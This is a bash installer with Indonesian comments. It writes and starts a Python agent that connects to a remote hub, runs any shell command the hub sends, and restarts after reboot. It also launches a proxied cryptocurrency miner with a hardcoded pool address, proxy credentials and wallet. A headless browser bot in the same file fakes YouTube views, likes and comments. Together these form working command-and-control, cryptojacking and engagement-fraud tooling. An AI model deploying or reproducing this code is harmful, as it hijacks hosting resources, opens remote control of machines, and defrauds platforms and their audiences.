#!/bin/bash
# ==============================================================================
# Muse VPS Fleet Manager - Bootstrap Installer Script
# Dijalankan sekali di setiap VPS Muse via chat Muse AI atau terminal.
# Penggunaan:
#   bash install_agent.sh --hub wss://xxxx.trycloudflare.com --name Muse-01
# ==============================================================================

set -e

# Nilai Default
HUB_URL=""
VPS_NAME=""
WORKSPACE="$HOME/workspace"

# Parsing Argumen
while [[ $# -gt 0 ]]; do
  case $1 in
    --hub)
      HUB_URL="$2"
      shift 2
      ;;
    --name)
      VPS_NAME="$2"
      shift 2
      ;;
    *)
      echo "Argumen tidak dikenal: $1"
      shift
      ;;
  esac
done

if [ -z "$HUB_URL" ]; then
    echo "❌ Error: Parameter --hub wajib diisi! Contoh: --hub wss://abc123.trycloudflare.com"
    exit 1
fi

if [ -z "$VPS_NAME" ]; then
    VPS_NAME="$(hostname)"
fi

echo "=========================================================="
echo "🚀 MEMASANG MUSE VPS FLEET MANAGER AGENT"
echo "=========================================================="
echo "📁 Direktori Kerja : $WORKSPACE"
echo "🌐 Hub Server URL  : $HUB_URL"
echo "🏷️  Nama VPS       : $VPS_NAME"
echo "=========================================================="

# 1. Pastikan direktori ~/workspace ada
mkdir -p "$WORKSPACE"
cd "$WORKSPACE"

# 2. Simpan identitas permanen
echo "$HUB_URL" > "$WORKSPACE/.hub_url"
echo "$VPS_NAME" > "$WORKSPACE/.vps_name"

if [ ! -f "$WORKSPACE/.agent_id" ]; then
    # Buat UUID baru jika belum ada
    if command -v uuidgen >/dev/null 2>&1; then
        uuidgen > "$WORKSPACE/.agent_id"
    else
        cat /proc/sys/kernel/random/uuid > "$WORKSPACE/.agent_id"
    fi
fi

echo "✅ Identitas permanen tersimpan di $WORKSPACE."

# 3. Install Dependensi Python
echo "📦 Menginstall dependensi Python (websockets, playwright)..."
pip3 install --quiet --upgrade websockets playwright || pip install --quiet --upgrade websockets playwright

echo "🌐 Menginstall Chromium browser untuk Playwright..."
python3 -m playwright install --with-deps chromium > /dev/null 2>&1 || true

# 4. Generate file agent.py di ~/workspace/ via Heredoc
echo "📝 Menulis ~/workspace/agent.py..."
cat << 'EOF_AGENT' > "$WORKSPACE/agent.py"
#!/usr/bin/env python3
import asyncio, json, logging, os, platform, socket, subprocess, sys, time, uuid

try:
    import websockets
except ImportError:
    print("[ERROR] websockets tidak ditemukan! Jalankan: pip3 install websockets")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", handlers=[logging.StreamHandler(sys.stdout)])
logger = logging.getLogger("MuseAgent")

WORKSPACE_DIR = os.path.expanduser("~/workspace")
AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".agent_id")
VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")
MINING_DIR = os.path.join(WORKSPACE_DIR, "gaszep")
MINING_CONF_FILE = os.path.join(WORKSPACE_DIR, ".mining_config.json")

def get_or_create_agent_id() -> str:
    os.makedirs(WORKSPACE_DIR, exist_ok=True)
    if os.path.exists(AGENT_ID_FILE):
        try:
            with open(AGENT_ID_FILE, "r") as f:
                aid = f.read().strip()
                if aid: return aid
        except Exception: pass
    new_id = str(uuid.uuid4())
    try:
        with open(AGENT_ID_FILE, "w") as f: f.write(new_id)
    except Exception: pass
    return new_id

def get_vps_name() -> str:
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r") as f:
                name = f.read().strip()
                if name: return name
        except Exception: pass
    return socket.gethostname()

def get_hub_url() -> str:
    if os.environ.get("HUB_URL"): return os.environ.get("HUB_URL")
    if os.path.exists(HUB_URL_FILE):
        try:
            with open(HUB_URL_FILE, "r") as f:
                url = f.read().strip()
                if url: return url
        except Exception: pass
    return "ws://localhost:9000"

_prev_cpu_total = 0
_prev_cpu_idle = 0

def read_cpu_percent() -> float:
    global _prev_cpu_total, _prev_cpu_idle
    try:
        with open("/proc/stat", "r") as f:
            fields = [float(x) for x in f.readline().strip().split()[1:8]]
            idle = fields[3] + fields[4]
            total = sum(fields)
            diff_idle = idle - _prev_cpu_idle
            diff_total = total - _prev_cpu_total
            _prev_cpu_idle = idle
            _prev_cpu_total = total
            if diff_total == 0: return 0.0
            pct = 100.0 * (1.0 - (diff_idle / diff_total))
            return round(max(0.0, min(100.0, pct)), 1)
    except Exception: return 0.0

def get_system_stats() -> dict:
    mem_free_mb = 0
    uptime_str = "-"
    try:
        with open("/proc/meminfo", "r") as f:
            mem_data = {}
            for line in f:
                parts = line.split(":")
                if len(parts) == 2:
                    mem_data[parts[0].strip()] = int(parts[1].strip().split()[0])
            available = mem_data.get("MemAvailable", mem_data.get("MemFree", 0))
            mem_free_mb = int(available / 1024)
    except Exception: pass

    try:
        with open("/proc/uptime", "r") as f:
            total_sec = float(f.readline().split()[0])
            hours = int(total_sec // 3600)
            minutes = int((total_sec % 3600) // 60)
            uptime_str = f"{hours}h {minutes}m"
    except Exception: pass

    return {"mem_free_mb": mem_free_mb, "uptime": uptime_str, "cpu_pct": read_cpu_percent()}

class MiningSupervisor:
    def __init__(self):
        self.active_process = None

    def is_running(self) -> bool:
        try:
            res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
            return len(res.stdout.strip()) > 0
        except Exception: return False

    def start_or_update(self, config: dict) -> str:
        proxy = config.get("proxy", "43.135.146.244:443")
        username = config.get("username", "aku")
        password = config.get("password", "akukayaraya")
        pool = config.get("pool", "43.135.146.244:10080")
        algo = config.get("algo", "rx/0")
        wallet = config.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")

        try:
            with open(MINING_CONF_FILE, "w") as f: json.dump(config, f, indent=2)
        except Exception: pass

        if not os.path.exists(MINING_DIR):
            return f"Folder {MINING_DIR} belum ada di VPS!"

        self.stop()
        conf_path = os.path.join(MINING_DIR, "graftcp/local/graftcp-local.conf")
        os.makedirs(os.path.dirname(conf_path), exist_ok=True)
        conf_content = f"listen = :2233\nloglevel = 1\nsocks5 = {proxy}\nsocks5_username = {username}\nsocks5_password = {password}\n"
        with open(conf_path, "w") as f: f.write(conf_content)

        check_local = subprocess.run(["pgrep", "-f", "graftcp-local"], stdout=subprocess.PIPE, text=True)
        if not check_local.stdout.strip():
            local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
            subprocess.Popen([local_bin, "-config", conf_path], cwd=MINING_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

        gasdag_bin = os.path.join(MINING_DIR, "gasdag")
        if os.path.exists(gasdag_bin): os.chmod(gasdag_bin, 0o755)

        graftcp_bin = os.path.join(MINING_DIR, "graftcp/graftcp")
        worker_id = f"{wallet}.{socket.gethostname()}"
        miner_cmd = [graftcp_bin, gasdag_bin, "-a", algo, "-o", pool, "-u", worker_id, "-p", "x"]
        self.active_process = subprocess.Popen(miner_cmd, cwd=MINING_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"Mining aktif! PID: {self.active_process.pid} ({algo} @ {pool})"

    def stop(self) -> str:
        try:
            subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "Mining berhasil dihentikan."
        except Exception as e: return f"Error: {e}"

mining_sup = MiningSupervisor()
active_tasks = []

def get_active_tasks_list():
    tasks = []
    if mining_sup.is_running(): tasks.append("Mining")
    tasks.extend(active_tasks)
    return tasks

async def run_youtube_worker_task(campaign: dict, ws, agent_id: str):
    worker_script = os.path.join(WORKSPACE_DIR, "youtube_worker.py")
    if not os.path.exists(worker_script):
        await ws.send(json.dumps({"type": "TASK_DONE", "agent_id": agent_id, "task": "YOUTUBE", "detail": "Script youtube_worker.py belum ada!"}))
        return

    task_name = "YouTube Bot"
    if task_name not in active_tasks: active_tasks.append(task_name)
    try:
        await ws.send(json.dumps({"type": "TASK_UPDATE", "agent_id": agent_id, "task": "YOUTUBE", "detail": f"Membuka browser: {campaign.get('search_query')}"}))
        proc = await asyncio.create_subprocess_exec(sys.executable, worker_script, json.dumps(campaign), stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        while True:
            line = await proc.stdout.readline()
            if not line: break
            text = line.decode().strip()
            if text:
                try:
                    update_data = json.loads(text)
                    if update_data.get("type") == "PROGRESS":
                        await ws.send(json.dumps({"type": "TASK_UPDATE", "agent_id": agent_id, "task": "YOUTUBE", "detail": update_data.get("detail")}))
                except Exception: pass
        await proc.wait()
        await ws.send(json.dumps({"type": "TASK_DONE", "agent_id": agent_id, "task": "YOUTUBE", "detail": "Kampanye YouTube selesai!" if proc.returncode == 0 else "Gagal eksekusi YouTube."}))
    finally:
        if task_name in active_tasks: active_tasks.remove(task_name)

async def execute_command(msg: dict, ws, agent_id: str):
    mtype = msg.get("type")
    if mtype == "PING":
        await ws.send(json.dumps({"type": "PONG", "agent_id": agent_id, "sent_ts": msg.get("sent_ts", 0)}))
    elif mtype == "STATUS":
        stats = get_system_stats()
        await ws.send(json.dumps({"type": "HEARTBEAT", "agent_id": agent_id, "active_tasks": get_active_tasks_list(), **stats}))
    elif mtype == "OPEN_URL":
        url = msg.get("url")
        for cmd in [["xdg-open", url], ["chromium-browser", "--no-sandbox", url], ["python3", "-m", "webbrowser", url]]:
            try:
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                break
            except Exception: pass
        await ws.send(json.dumps({"type": "TASK_DONE", "agent_id": agent_id, "task": "OPEN_URL", "detail": f"Buka URL: {url}"}))
    elif mtype == "SHELL":
        cmd_str = msg.get("cmd")
        try:
            proc = subprocess.run(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
            await ws.send(json.dumps({"type": "RESULT", "agent_id": agent_id, "output": (proc.stdout + proc.stderr)[:2000], "exit_code": proc.returncode}))
        except Exception as e:
            await ws.send(json.dumps({"type": "RESULT", "agent_id": agent_id, "output": str(e), "exit_code": 1}))
    elif mtype == "YOUTUBE_CAMPAIGN":
        asyncio.create_task(run_youtube_worker_task(msg.get("campaign", {}), ws, agent_id))
    elif mtype == "MINING_ACTION":
        act = msg.get("action")
        res = mining_sup.start_or_update(msg.get("config", {})) if act == "START" else mining_sup.stop()
        await ws.send(json.dumps({"type": "TASK_DONE", "agent_id": agent_id, "task": "MINING", "detail": res}))

async def heartbeat_loop(ws, agent_id: str):
    while True:
        try:
            await asyncio.sleep(30)
            stats = get_system_stats()
            await ws.send(json.dumps({"type": "HEARTBEAT", "agent_id": agent_id, "active_tasks": get_active_tasks_list(), **stats}))
        except Exception: break

async def main():
    agent_id = get_or_create_agent_id()
    vps_name = get_vps_name()
    hub_url = get_hub_url()
    logger.info(f"Agent siap. Hub: {hub_url} | Name: {vps_name}")

    if os.path.exists(MINING_CONF_FILE):
        try:
            with open(MINING_CONF_FILE, "r") as f:
                mining_sup.start_or_update(json.load(f))
        except Exception: pass

    while True:
        try:
            async with websockets.connect(hub_url, ping_interval=20, ping_timeout=20) as ws:
                await ws.send(json.dumps({"type": "HELLO", "agent_id": agent_id, "vps_name": vps_name, "os": platform.system(), "python": platform.python_version()}))
                stats = get_system_stats()
                await ws.send(json.dumps({"type": "HEARTBEAT", "agent_id": agent_id, "active_tasks": get_active_tasks_list(), **stats}))
                hb_task = asyncio.create_task(heartbeat_loop(ws, agent_id))
                async for message in ws:
                    try: await execute_command(json.loads(message), ws, agent_id)
                    except Exception: pass
                hb_task.cancel()
        except Exception as e:
            logger.warning(f"Koneksi Hub terputus ({e}). Reconnect dalam 30s...")
        await asyncio.sleep(30)

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
EOF_AGENT

chmod +x "$WORKSPACE/agent.py"

# 5. Generate file youtube_worker.py di ~/workspace/ via Heredoc
echo "📝 Menulis ~/workspace/youtube_worker.py..."
cat << 'EOF_YT' > "$WORKSPACE/youtube_worker.py"
#!/usr/bin/env python3
import asyncio, json, os, random, sys, time, urllib.parse
sys.stdout.reconfigure(line_buffering=True)

def emit_progress(detail: str):
    print(json.dumps({"type": "PROGRESS", "detail": detail}), flush=True)

async def run_campaign(campaign: dict):
    search_query = campaign.get("search_query", "").strip()
    target_channel = campaign.get("target_channel", "").strip().lower()
    min_duration = int(campaign.get("watch_duration_min", 300))
    max_duration = int(campaign.get("watch_duration_max", 600))
    auto_like = campaign.get("auto_like", True)
    auto_comment = campaign.get("auto_comment", True)
    comments_pool = campaign.get("comments", [])

    if not search_query:
        emit_progress("Error: Kata kunci pencarian kosong!")
        sys.exit(1)

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        emit_progress("Error: Playwright belum terpasang!")
        sys.exit(1)

    profile_dir = os.path.expanduser("~/workspace/browser_profile")
    os.makedirs(profile_dir, exist_ok=True)
    target_watch_time = random.randint(min_duration, max_duration)
    emit_progress(f"Membuka browser. Target tonton: {target_watch_time} detik (~{target_watch_time//60} menit)")

    async with async_playwright() as p:
        browser_context = await p.chromium.launch_persistent_context(
            profile_dir,
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--mute-audio", "--disable-blink-features=AutomationControlled"],
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        )
        page = await browser_context.new_page()
        try:
            search_url = f"https://www.youtube.com/results?search_query={urllib.parse.quote_plus(search_query)}"
            emit_progress(f"Mencari video: {search_query}")
            await page.goto(search_url, wait_until="domcontentloaded", timeout=45000)
            await asyncio.sleep(3)

            video_clicked = False
            if target_channel:
                for _ in range(4):
                    for v in await page.locator("ytd-video-renderer").all():
                        if target_channel in (await v.inner_text()).lower():
                            title_el = v.locator("#video-title")
                            if await title_el.is_visible():
                                await title_el.click()
                                video_clicked = True
                                break
                    if video_clicked: break
                    await page.evaluate("window.scrollBy(0, 1000)")
                    await asyncio.sleep(2)

            if not video_clicked:
                first_video = page.locator("ytd-video-renderer #video-title").first
                await first_video.wait_for(state="visible", timeout=15000)
                await first_video.click()

            await page.wait_for_selector("video", state="attached", timeout=30000)
            emit_progress("Pemutaran video dimulai!")

            try: await page.evaluate("const v = document.querySelector('video'); if (v && v.paused) v.play();")
            except Exception: pass

            elapsed = 0
            while elapsed < target_watch_time:
                step = min(30, target_watch_time - elapsed)
                await asyncio.sleep(step)
                elapsed += step
                if random.random() < 0.3:
                    await page.evaluate(f"window.scrollBy(0, {random.randint(100, 300)})")
                    await asyncio.sleep(1)
                    await page.evaluate(f"window.scrollBy(0, -{random.randint(50, 150)})")
                emit_progress(f"Menonton... ({elapsed // 60}:{elapsed % 60:02d} / {target_watch_time // 60}:{target_watch_time % 60:02d})")

            if auto_like:
                try:
                    like_btn = page.locator("like-button-view-model button, button[aria-label*='like this video' i]").first
                    if await like_btn.is_visible(timeout=5000):
                        if (await like_btn.get_attribute("aria-pressed")) != "true":
                            await like_btn.click()
                            emit_progress("👍 Berhasil Like!")
                except Exception: pass

            if auto_comment and comments_pool:
                chosen = random.choice(comments_pool).strip()
                try:
                    await page.evaluate("window.scrollTo(0, 600)")
                    await asyncio.sleep(2)
                    comment_box = page.locator("#simplebox-placeholder, #placeholder-area").first
                    if await comment_box.is_visible(timeout=8000):
                        await comment_box.click()
                        await asyncio.sleep(1)
                        inp = page.locator("#contenteditable-root").first
                        await inp.wait_for(state="visible", timeout=5000)
                        for char in chosen:
                            await inp.type(char, delay=random.randint(40, 120))
                        await asyncio.sleep(1)
                        submit = page.locator("#submit-button button").first
                        if await submit.is_enabled(timeout=5000):
                            await submit.click()
                            emit_progress(f"💬 Komentar terkirim: '{chosen}'")
                except Exception: pass

            emit_progress("Tugas selesai.")
        finally:
            await browser_context.close()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(run_campaign(json.loads(sys.argv[1])))
EOF_YT

chmod +x "$WORKSPACE/youtube_worker.py"

# 6. Registrasi ke Muse Scheduler & Auto-Start
echo "⚙️ Mendaftarkan agent ke Muse Scheduler..."
if command -v muse-scheduler >/dev/null 2>&1; then
    muse-scheduler add "python3 $WORKSPACE/agent.py" || true
    echo "✅ Berhasil didaftarkan ke Muse Scheduler."
fi

# Buat script auto-run jika VPS restart (fallback loop)
cat << 'EOF_RUN' > "$WORKSPACE/start_agent.sh"
#!/bin/bash
while true; do
    python3 "$HOME/workspace/agent.py"
    sleep 10
done
EOF_RUN
chmod +x "$WORKSPACE/start_agent.sh"

# 7. Hentikan agent lama dan jalankan yang baru di background
echo "🚀 Memulai agent.py di background..."
pkill -f "agent.py" || true
nohup python3 "$WORKSPACE/agent.py" > "$WORKSPACE/agent.log" 2>&1 &

echo ""
echo "=========================================================="
echo "🎉 INSTALASI SUKSES!"
echo "Agent $VPS_NAME sekarang terhubung ke:"
echo "👉 $HUB_URL"
echo "Log agent dapat dilihat dengan: tail -f $WORKSPACE/agent.log"
echo "=========================================================="
